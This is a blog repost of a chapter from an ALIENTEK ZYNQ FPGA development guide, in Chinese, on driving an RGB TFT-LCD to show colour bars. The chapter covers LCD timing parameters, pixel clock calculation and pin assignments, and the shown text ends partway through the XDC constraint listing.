<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【正点原子FPGA连载】 第十八章 RGB LCD彩条显示实验 -摘自【正点原子】领航者ZYNQ之FPGA开发指南_V2.0 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【正点原子FPGA连载】 第十八章 RGB LCD彩条显示实验 -摘自【正点原子】领航者ZYNQ之FPGA开发指南_V2.0" />
<meta property="og:description" content="1）实验平台：正点原子领航者ZYNQ开发板
2）平台购买地址：https://item.taobao.com/item.htm?&amp;id=606160108761
3）全套实验源码&#43;手册&#43;视频下载地址：http://www.openedv.com/thread-301505-1-1.html
4）对正点原子FPGA感兴趣的同学可以加群讨论：994244016
5）关注正点原子公众号，获取最新资料更新
第十八章 RGB LCD彩条显示实验 TFT-LCD是一种液晶显示屏，它采用薄膜晶体管（TFT）技术提升图像质量，如提高图像亮度和对比度等。相比于传统的CRT显示器，TFT-LCD有着轻薄、功耗低、无辐射、图像质量好等诸多优点，因此广泛应用于电视机、电脑显示器、手机等各种显示设备中。
本章包括以下几个部分：
18.1 RGB LCD简介
18.2 实验任务
18.3 硬件设计
18.4 程序设计
18.5 下载验证
18.1 RGB LCD简介
TFT-LCD的全称是Thin Film Transistor-Liquid Crystal Display，即薄膜晶体管液晶显示屏，它显示的每个像素点都是由集成在液晶后面的薄膜晶体管独立驱动，因此TFT-LCD具有较高的响应速度以及较好的图像质量。正点原子推出的RGB LCD液晶屏较多，7寸RGB LCD屏的实物图如下图所示：
第十八章 RGB LCD彩条显示实验
TFT-LCD是一种液晶显示屏，它采用薄膜晶体管（TFT）技术提升图像质量，如提高图像亮度和对比度等。相比于传统的CRT显示器，TFT-LCD有着轻薄、功耗低、无辐射、图像质量好等诸多优点，因此广泛应用于电视机、电脑显示器、手机等各种显示设备中。
本章包括以下几个部分：
18.1 RGB LCD简介
18.2 实验任务
18.3 硬件设计
18.4 程序设计
18.5 下载验证
18.1 RGB LCD简介
TFT-LCD的全称是Thin Film Transistor-Liquid Crystal Display，即薄膜晶体管液晶显示屏，它显示的每个像素点都是由集成在液晶后面的薄膜晶体管独立驱动，因此TFT-LCD具有较高的响应速度以及较好的图像质量。正点原子推出的RGB LCD液晶屏较多，7寸RGB LCD屏的实物图如下图所示：
图 7.5.13.1 ATK-7’RGB接口TFT液晶屏模块
液晶显示器是现在最常用到的显示器，手机、电脑、各种人机交互设备等基本都用到了LCD，最常见的就是手机和电脑显示器了。由于笔者不是LCD从业人员，对于LCD的具体原理不了解，百度百科对于 LCD的原理解释如下：
LCD的构造是在两片平行的玻璃基板当中放置液晶盒，下基板玻璃上设置 TFT（薄膜晶体管），上基板玻璃上设置彩色滤光片，通过TFT上的信号与电压改变来控制液晶分子的转动方向，从而达到控制每个像素点偏振光出射与否而达到显示目的。我们现在要在领航者开发板上使用LCD，所以不需要去研究LCD 的具体实现原理，我们只需要从使用的角度去关注 LCD 的几个重要点：
1、分辨率
提起LCD显示器，我们都会听到720P、1080P、2K或4K这样的字眼，这个就是LCD显示器分辨率。 LCD显示器都是由一个一个的像素点组成，像素点就类似一个灯(在OLED显示器中，像素点就是一个小灯)，这个小灯是RGB灯，也就是由R(红色)、G(绿色)和B(蓝色)这三种颜色组成的，而RGB就是光的三原色。 1080P的意思就是一个LCD屏幕上的像素数量是1920*1080个，也就是这个屏幕一列1080个像素点，一共 1920列，如图 7." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/9afbfe4b22c58e3c44d0b3c3a635cb47/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-04T18:07:07+08:00" />
<meta property="article:modified_time" content="2022-01-04T18:07:07+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【正点原子FPGA连载】 第十八章 RGB LCD彩条显示实验 -摘自【正点原子】领航者ZYNQ之FPGA开发指南_V2.0</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>1）实验平台：正点原子领航者ZYNQ开发板<br> 2）平台购买地址：<a href="https://item.taobao.com/item.htm?&amp;id=606160108761" rel="nofollow">https://item.taobao.com/item.htm?&amp;id=606160108761</a><br> 3）全套实验源码+手册+视频下载地址：<a href="http://www.openedv.com/thread-301505-1-1.html" rel="nofollow">http://www.openedv.com/thread-301505-1-1.html</a><br> 4）对正点原子FPGA感兴趣的同学可以加群讨论：994244016<br> 5）关注正点原子公众号，获取最新资料更新<br> <img src="https://images2.imgbox.com/60/d5/xZk6Xqnv_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_RGB_LCD_7"></a>第十八章 RGB LCD彩条显示实验</h2> 
<p>TFT-LCD是一种液晶显示屏，它采用薄膜晶体管（TFT）技术提升图像质量，如提高图像亮度和对比度等。相比于传统的CRT显示器，TFT-LCD有着轻薄、功耗低、无辐射、图像质量好等诸多优点，因此广泛应用于电视机、电脑显示器、手机等各种显示设备中。<br> 本章包括以下几个部分：<br> 18.1 RGB LCD简介<br> 18.2 实验任务<br> 18.3 硬件设计<br> 18.4 程序设计<br> 18.5 下载验证<br>  <br> 18.1 RGB LCD简介<br> TFT-LCD的全称是Thin Film Transistor-Liquid Crystal Display，即薄膜晶体管液晶显示屏，它显示的每个像素点都是由集成在液晶后面的薄膜晶体管独立驱动，因此TFT-LCD具有较高的响应速度以及较好的图像质量。正点原子推出的RGB LCD液晶屏较多，7寸RGB LCD屏的实物图如下图所示：<br> 第十八章 RGB LCD彩条显示实验<br> TFT-LCD是一种液晶显示屏，它采用薄膜晶体管（TFT）技术提升图像质量，如提高图像亮度和对比度等。相比于传统的CRT显示器，TFT-LCD有着轻薄、功耗低、无辐射、图像质量好等诸多优点，因此广泛应用于电视机、电脑显示器、手机等各种显示设备中。<br> 本章包括以下几个部分：<br> 18.1 RGB LCD简介<br> 18.2 实验任务<br> 18.3 硬件设计<br> 18.4 程序设计<br> 18.5 下载验证<br>  <br> 18.1 RGB LCD简介<br> TFT-LCD的全称是Thin Film Transistor-Liquid Crystal Display，即薄膜晶体管液晶显示屏，它显示的每个像素点都是由集成在液晶后面的薄膜晶体管独立驱动，因此TFT-LCD具有较高的响应速度以及较好的图像质量。正点原子推出的RGB LCD液晶屏较多，7寸RGB LCD屏的实物图如下图所示：<br> <img src="https://images2.imgbox.com/70/7e/BvDiRJDC_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.1 ATK-7’RGB接口TFT液晶屏模块<br> 液晶显示器是现在最常用到的显示器，手机、电脑、各种人机交互设备等基本都用到了LCD，最常见的就是手机和电脑显示器了。由于笔者不是LCD从业人员，对于LCD的具体原理不了解，百度百科对于 LCD的原理解释如下：<br> LCD的构造是在两片平行的玻璃基板当中放置液晶盒，下基板玻璃上设置 TFT（薄膜晶体管），上基板玻璃上设置彩色滤光片，通过TFT上的信号与电压改变来控制液晶分子的转动方向，从而达到控制每个像素点偏振光出射与否而达到显示目的。我们现在要在领航者开发板上使用LCD，所以不需要去研究LCD 的具体实现原理，我们只需要从使用的角度去关注 LCD 的几个重要点：<br> 1、分辨率<br> 提起LCD显示器，我们都会听到720P、1080P、2K或4K这样的字眼，这个就是LCD显示器分辨率。 LCD显示器都是由一个一个的像素点组成，像素点就类似一个灯(在OLED显示器中，像素点就是一个小灯)，这个小灯是RGB灯，也就是由R(红色)、G(绿色)和B(蓝色)这三种颜色组成的，而RGB就是光的三原色。 1080P的意思就是一个LCD屏幕上的像素数量是1920*1080个，也就是这个屏幕一列1080个像素点，一共 1920列，如图 7.5.13.2所示：<br> <img src="https://images2.imgbox.com/b2/81/Kdwvo620_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.2 像素点排布<br> 图 7.5.13.2就是1080P显示器的像素示意图，X轴就是LCD显示器的横轴，Y轴就是显示器的竖轴。图中的小方块就是像素点，一共有1920<em>1080=2073600个像素点。左上角的A点是第一个像素点，右下角的C点就是最后一个像素点。2K就是2560</em>1440个像素点，4K是3840<em>2160个像素点。很明显，在LCD尺寸不变的情况下，分辨率越高越清晰。同样的，分辨率不变的情况下，LCD尺寸越小越清晰。比如我们常用的24寸显示器基本都是1080P的，而我们现在使用的5寸的手机基本也是1080P的，但是手机显示细腻程度就要比24寸的显示器要好很多！由此可见，LCD显示器的分辨率是一个很重要的参数，但是并不是分辨率越高的LCD就越好。衡量一款LCD的好坏，分辨率只是其中的一个参数，还有色彩还原程度、色彩偏离、亮度、可视角度、屏幕刷新率等其他参数。<br> 2、像素格式<br> 上面讲了，一个像素点就相当于一个RGB小灯，通过控制R、G、B这三种颜色的亮度就可以显示出各种各样的色彩。那该如何控制R、G、B这三种颜色的显示亮度呢？一般一个R、G、B这三部分分别使用8bit的数据，那么一个像素点就是8bit</em>3=24bit，也就是说一个像素点3个字节，这种像素格式称为 RGB888。当然常用的像素点格式还有RGB565，只需要两个字节，但在色彩鲜艳度上较差一些。我们领航者开发板上的RGB TFT-LCD接口采用的RGB888的像素格式，共需要24位，每一位对应RGB的颜色分量如下图所示：<br> <img src="https://images2.imgbox.com/a8/ac/ZQIFZw8V_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.3 RGB888数据格式<br> 在图 7.5.13.3中，一个像素点占用3个字节，其中bit23<sub>bit16是RED通道，bit15</sub>bit8是GREEN通道，bit7~bit0是BLUE通道。所以红色对应的值就是24’hFF0000，绿色对应的值就是24’h00FF00，蓝色对应的值为24’h0000FF。通过调节R、G、B的比例可以产生其它的颜色，比如24’hFFFF00就是黄色，24’h000000就是黑色，24’hFFFFFF就是白色。大家可以打开电脑的“画图”工具，在里面使用调色板即可获取到想要的颜色对应的数值，如图 7.5.13.4所示：<br> <img src="https://images2.imgbox.com/54/22/8kFJ2Dqy_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.4 调色板颜色选取<br> 3、LCD屏幕接口<br> LCD屏幕或者说显示器有很多种接口，比如在显示器上常见的VGA、HDMI、DP等等，领航者开发板支持RGB接口的LCD和HDMI接口的显示器。本章我们介绍的是RGB LCD接口，RGB LCD接口的信号线如下表所示：<br> 表 18.1.1 RGB数据线<br> 信号线 描述<br> R[7:0] 8根红色数据线<br> G[7:0] 8根绿色数据线<br> B[7:0] 8根蓝色数据线<br> DE 数据使能线<br> VSYNC 垂直同步信号线<br> HSYNC 水平同步信号线<br> PCLK 像素时钟信号线<br> 表 18.1.1就是RGB LCD的信号线，R[7:0]、G[7:0]和B[7:0]是24位数据，DE、VSYNC、HSYNC和PCLK是四个控制信号。<br> 正点原子一共有五款RGB LCD屏幕，型号分别为ATK-4342（4.3寸，480<em>272）、ATK-4384（4.3寸，800</em>480）、ATK-7084（7寸，800<em>480）、ATK-7016（7寸，1024</em>600）和ATK-1018（10.1寸，1280*800）。这里以ATK-7016这款屏幕为例讲解，ATK-7016的屏幕接口原理图如所示：<br> <img src="https://images2.imgbox.com/3d/06/tmvPR1OC_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.5 RGB LCD液晶屏幕接口<br> 图中J1就是对外接口，是一个40PIN的FPC座（0.5mm间距），通过FPC线，可以连接到领航者ZYNQ开发板上面，从而实现和开发板的连接。该接口十分完善，采用RGB888格式，并支持触摸屏和背光控制。右侧的几个电阻，并不是都焊接的，而是可以用户自己选择。默认情况，R1和R6 焊接，设置LCD_LR和LCD_UD，控制LCD的扫描方向，是从左到右，从上到下（横屏看）。而LCD_R7/G7/B7 则用来设置LCD的ID，由于RGBLCD没有读写寄存器，也就没有所谓的ID，这里我们通过在模块上面，控制R7/G7/B7的上/下拉，来自定义LCD模块的ID，帮助MCU判断当前LCD面板的分辨率和相关参数，以提高程序兼容性。这几个位的设置关系如表 18.1.2所示：<br> 表 18.1.2 RGB LCD模块和ID对应关系<br> M2<br> LCD_B7 M1<br> LCD_G7 M0<br> LCD_R7 LCD ID 说明<br> 0 0 0 4342 ATK-4342 RGB LCD模块，分辨率：480<em>272<br> 0 0 1 7084 ATK-7084 RGB LCD模块，分辨率：800</em>480<br> 0 1 0 7016 ATK-7016 RGB LCD模块，分辨率：1024<em>600<br> 1 0 0 4384 ATK-4384 RGB LCD模块，分辨率：800</em>480<br> 1 0 1 1018 ATK-1018 RGB LCD模块，分辨率：1280<em>800<br> X X X NC 暂时未用到<br> ATK-7016模块，就设置M2:M0 = 010即可。这样，我们在程序里面，读取LCD_R7/G7/B7，得到M0:M2 的值，从而判断RGB LCD模块的型号，并执行不同的配置，即可实现不同LCD模块的兼容。<br> 4、LCD时间参数<br> 如果将LCD显示一帧图像的过程想象成绘画，那么在显示的过程中就是用一根“笔”在不同的像素点画上不同的颜色。这根笔按照从左至右、从上到下的顺序扫描每个像素点，并且在像素画上对应的颜色，当画到最后一个像素点的时候一幅图像就绘制好了。假如一个LCD的分辨率为1024</em>600，那么其扫描如图 7.5.13.6所示：<br> <img src="https://images2.imgbox.com/5a/af/K4yKtC1z_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.6 LCD一帧图像扫描图<br> 结合图 7.5.13.6我们来看一下LCD是怎么扫描显示一帧图像的。一帧图像也是由一行一行组成的。HSYNC是水平同步信号，也叫做行同步信号，当产生此信号的话就表示开始显示新的一行了，所以此信号都是在图 7.5.13.6的最左边。VSYNC信号是垂直同步信号，也叫做帧同步信号，当产生此信号的话就表示开始显示新的一帧图像了，所以此信号在图 7.5.13.6的左上角。<br> 在图 7.5.13.6可以看到有一圈“黑边”，真正有效的显示区域是中间的白色部分。那这一圈“黑边”是什么东西呢？这就要从显示器的“祖先”CRT显示器开始说起了，CRT显示器就是以前很常见的那种大屁股显示器，在2019年应该很少见了，如果在农村应该还是可以见到的。CRT显示器屁股后面是个电子枪，这个电子枪就是我们上面说的“画笔”，电子枪打出的电子撞击到屏幕上的荧光物质使其发光。只要控制电子枪从左到右扫完一行(也就是扫描一行)，然后从上到下扫描完所有行，这样一帧图像就显示出来了。也就是说，显示一帧图像电子枪是按照‘Z’形在运动，当扫描速度很快的时候看起来就是一幅完成的画面了。<br> 当显示完一行以后会发出HSYNC信号，此时电子枪就会关闭，然后迅速的移动到屏幕的左边，当 HSYNC信号结束以后就可以显示新的一行数据了，电子枪就会重新打开。在HSYNC信号结束到电子枪重新打开之间会插入一段延时，这段延时就是图 7.5.13.6中的HBP。当显示完一行以后就会关闭电子枪等待 HSYNC信号产生，关闭电子枪到HSYNC信号产生之间会插入一段延时，这段延时就是图 7.5.13.6中的HFP 信号。同理，当显示完一帧图像以后电子枪也会关闭，然后等到VSYNC信号产生，期间也会加入一段延时，这段延时就是图 7.5.13.6中的VFP。VSYNC信号产生，电子枪移动到左上角，当VSYNC信号结束以后电子枪重新打开，中间也会加入一段延时，这段延时就是图 7.5.13.6中的VBP。<br> HBP、HFP、VBP和VFP就是导致图 7.5.13.6中黑边的原因，但是这是CRT显示器存在黑边的原因，现在是LCD显示器，不需要电子枪了，那么为何还会有黑边呢？这是因为RGB LCD屏幕内部是有一个IC 的，发送一行或者一帧数据给IC，IC是需要反应时间的。通过这段反应时间可以让IC识别到一行数据扫描完了，要换行了，或者一帧图像扫描完了，要开始下一帧图像显示了。因此，在LCD屏幕中继续存在HBP、HFP、VPB和VFP这四个参数的主要目的是为了锁定有效的像素数据。<br> 5、RGB LCD屏幕时序<br> 上面介绍了LCD的时间参数，我们接下来看一下行显示对应的时序图，如图 7.5.13.7所示。<br> <img src="https://images2.imgbox.com/65/43/qeuELDos_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.7 LCD行显示时序<br> 图 7.5.13.7就是RGB LCD的行显示时序，我们来分析一下其中重要的几个参数：<br> HSYNC：行同步信号，当此信号有效的时候就表示开始显示新的一行数据，查阅所使用的LCD数据手册可以知道此信号是低电平有效还是高电平有效，图 7.5.13.7为低电平有效。<br> HSPW：行同步信号宽度，也就是HSYNC信号持续时间。HSYNC信号不是一个脉冲，而是需要持续一段时间才是有效的，单位为CLK。<br> HBP：行显示后沿（或后肩），单位是CLK。<br> HOZVAL：行有效显示区域，即显示一行数据所需的时间，假如屏幕分辨率为1024*600，那么HOZVAL 就是1024，单位为CLK。<br> HFP：行显示前沿（或前肩），单位是CLK。<br> 当HSYNC信号发出以后，需要等待HSPW+HBP个CLK时间才会接收到真正有效的像素数据。当显示完一行数据以后需要等待HFP个CLK时间才能发出下一个HSYNC信号，所以显示一行所需要的时间就是：HSPW + HBP + HOZVAL + HFP。<br> 一帧图像就是由很多个行组成的，RGB LCD的帧显示时序如图 7.5.13.8所示：<img src="https://images2.imgbox.com/8c/d1/Ckl0oHEU_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.8 LCD帧显示时序<br> 图 7.5.13.8就是RGB LCD的帧显示时序，我们来分析一下其中重要的几个参数：<br> VSYNC：帧（场）同步信号，当此信号有效的时候就表示开始显示新的一帧数据，查阅所使用的LCD数据手册可以知道此信号是低电平有效还是高电平有效，图 7.5.13.8为低电平有效。<br> VSPW：帧同步信号宽度，也就是VSYNC信号持续时间，单位为1行的时间。<br> VBP：帧显示后沿（或后肩），单位为1行的时间。<br> LINE：帧有效显示区域，即显示一帧数据所需的时间，假如屏幕分辨率为1024<em>600，那么LINE就是600行的时间。<br> VFP：帧显示前沿（或前肩），单位为1行的时间。<br> 显示一帧所需要的时间就是：VSPW+VBP+LINE+VFP个行时间，最终的计算公式：<br> T = (VSPW+VBP+LINE+VFP) * (HSPW + HBP + HOZVAL + HFP)<br> 因此我们在配置一款RGB LCD屏的时候需要知道这几个参数：HSPW（行同步）、HBP（行显示后沿）、HOZVAL(行有效显示区域)、HFP（行显示前沿）、VSPW（场同步）、VBP（场显示后沿）、LINE(场有效显示区域)和VFP（场显示后沿）。<br> RGB LCD液晶屏一般有两种数据同步方式，一种是行场同步模式（HV Mode），另一种是数据使能同步模式（DE Mode）。当选择行场同步模式时，LCD接口的时序与VGA接口的时序图非常相似，只是参数不同，如图 16.1.9和图 16.1.8中的行同步信号（HSYNC）和场同步信号（VSYNC）作为数据的同步信号，此时数据使能信号（DE）必须为低电平。<br> 当选择DE同步模式时，LCD的DE信号作为数据的有效信号，，如图 16.1.10和图 16.1.8中的DE信号所示。只有同时扫描到帧有效显示区域和行有效显示区域时，DE信号才有效（高电平）。当选择DE同步模式时，此时行场同步信号VS和HS必须为高电平。<br> 由于RGB LCD液晶屏一般都支持DE模式，不是所有的RGB LCD液晶屏都支持HV模式，因此本章我们采用DE同步的方式驱动LCD液晶屏。<br> 6、像素时钟<br> 像素时钟就是RGB LCD的时钟信号，以ATK7016这款屏幕为例，显示一帧图像所需要的时钟数就是：<br> N（CLK）= (VSPW+VBP+LINE+VFP) * (HSPW + HBP + HOZVAL + HFP)<br> = (3 + 20 + 600 + 12) * (20 + 140 + 1024 + 160) = 635 * 1344 = 853440<br> 显示一帧图像需要853440个时钟数，那么显示60帧就是：853440 * 60 = 51206400≈51.2M，所以像素时钟就是51.2MHz。<br> 当然我们在为RGB LCD屏提供驱动时钟的时候，也可以不用严格按照60帧来进行计算。为了方便操作，我们可以给ATK7016模块输出一个50MHz的时钟，其刷新率是接近于60Hz的，同时也非常方便我们来编写代码。<br> 为了方便大家查找LCD屏的时序参数，这里整理了不同分辨率的时序参数，如表 18.1.3所示：<br> 表 18.1.3 不同分辨率的LCD时序参数<br> 显示分辨率 时钟（Mhz） 行时序（像素数） 帧时序（行数）<br> 行同步 显示后沿 显示 区域 显示前沿 显示 周期 场同步 显示后沿 显示区域 显示前沿 显示 周期<br> 480</em>272 9 41 2 480 2 525 10 2 272 2 286<br> 800<em>480 33.3 128 88 800 40 1056 2 33 480 10 525<br> 1024</em>600 50 20 140 1024 160 1344 3 20 600 12 635<br> 1280*800 70 10 80 1280 70 1440 3 10 800 10 823<br> 18.2 实验任务<br> 本节的实验任务是使用正点原子ZYNQ开发板上的RGB TFT-LCD接口，驱动RGB LCD液晶屏（支持目前推出的所有RGB LCD屏），并显示出彩条。<br> 18.3 硬件设计<br> 领航者开发板上RGB TFT-LCD接口部分的原理图如下图所示。<br> <img src="https://images2.imgbox.com/95/53/p6Qv1k5r_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.1 RGB TFTLCD接口原理图<br> 从上图中可以看到，FPGA管脚输出的颜色数据位宽为24bit，数据格式为RGB888，即数据高8位表示红色，中间8位表示绿色，低8位表示蓝色。由于这24位数据不仅仅作为输出给LCD屏的颜色数据，同时LCD_R7、LCD_G7和LCD_B7也用来获取LCD屏的ID，因此这24位颜色数据对ZYNQ开发板来说，是一个双向的引脚。<br> 另外，RGBLCD模块支持触摸功能，图中以字母T开头的5个信号（T_PEN、T_SCK等）与模块上的触摸芯片相连接。由于本次实验不涉及触摸功能的实现，因此这些信号并未用到。<br> 需要说明的是，LCD液晶屏有一个复位信号（LCD_RST），当LCD_RST为低电平时，可对LCD屏进行复位。<br> 本实验中，各端口信号的管脚分配如下表所示：<br> 表 18.3.1 RGB TFT-LCD彩条实验管脚分配<br> 信号名 方向 管脚 端口说明 电平标准<br> sys_clk input U18 系统时钟，50M LVCMOS33<br> sys_rst_n input N16 系统复位，低有效 LVCMOS33<br> lcd_rgb[0] inout W18 RGB LCD蓝色（最低位） LVCMOS33<br> lcd_rgb[1] inout W19 RGB LCD蓝色 LVCMOS33<br> lcd_rgb[2] inout R16 RGB LCD蓝色 LVCMOS33<br> lcd_rgb[3] inout R17 RGB LCD蓝色 LVCMOS33<br> lcd_rgb[4] inout W20 RGB LCD蓝色 LVCMOS33<br> lcd_rgb[5] inout V20 RGB LCD蓝色 LVCMOS33<br> lcd_rgb[6] inout P18 RGB LCD蓝色 LVCMOS33<br> lcd_rgb[7] inout N17 RGB LCD蓝色（最高位） LVCMOS33<br> lcd_rgb[8] inout V17 RGB LCD绿色（最低位） LVCMOS33<br> lcd_rgb[9] inout V18 RGB LCD绿色 LVCMOS33<br> lcd_rgb[10] inout T17 RGB LCD绿色 LVCMOS33<br> lcd_rgb[11] inout R18 RGB LCD绿色 LVCMOS33<br> lcd_rgb[12] inout Y18 RGB LCD绿色 LVCMOS33<br> lcd_rgb[13] inout Y19 RGB LCD绿色 LVCMOS33<br> lcd_rgb[14] inout P15 RGB LCD绿色 LVCMOS33<br> lcd_rgb[15] inout P16 RGB LCD绿色（最高位） LVCMOS33<br> lcd_rgb[16] inout V16 RGB LCD红色（最低位） LVCMOS33<br> lcd_rgb[17] inout W16 RGB LCD红色 LVCMOS33<br> lcd_rgb[18] inout T14 RGB LCD红色 LVCMOS33<br> lcd_rgb[19] inout T15 RGB LCD红色 LVCMOS33<br> lcd_rgb[20] inout Y17 RGB LCD红色 LVCMOS33<br> lcd_rgb[21] inout Y16 RGB LCD红色 LVCMOS33<br> lcd_rgb[22] inout T16 RGB LCD红色 LVCMOS33<br> lcd_rgb[23] inout U17 RGB LCD红色（最高位） LVCMOS33<br> lcd_hs output N18 RGB LCD行同步 LVCMOS33<br> lcd_vs output T20 RGB LCD场同步 LVCMOS33<br> lcd_de output U20 RGB LCD数据使能 LVCMOS33<br> lcd_bl output M20 RGB LCD背光控制 LVCMOS33<br> lcd_clk output P19 RGB LCD像素时钟 LVCMOS33<br> lcd_rst output L17 RGB LCD复位信号 LVCMOS33<br> 对应的XDC约束语句如下所示：</p> 
<pre><code class="prism language-c">set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN U18 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports sys_clk<span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN N16 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports sys_rst_n<span class="token punctuation">]</span>

set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN W18 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN W19 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN R16 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN R17 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN W20 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN V20 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN P18 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN N17 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN V17 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN V18 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN T17 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN R18 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
set_property <span class="token operator">-</span>dict <span class="token punctuation">{<!-- --></span>PACKAGE_PIN Y18 IOSTANDARD LVCMOS33<span class="token punctuation">}</span> <span class="token punctuation">[</span>get_ports <span class="token punctuation">{<!-- --></span>lcd_rgb<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
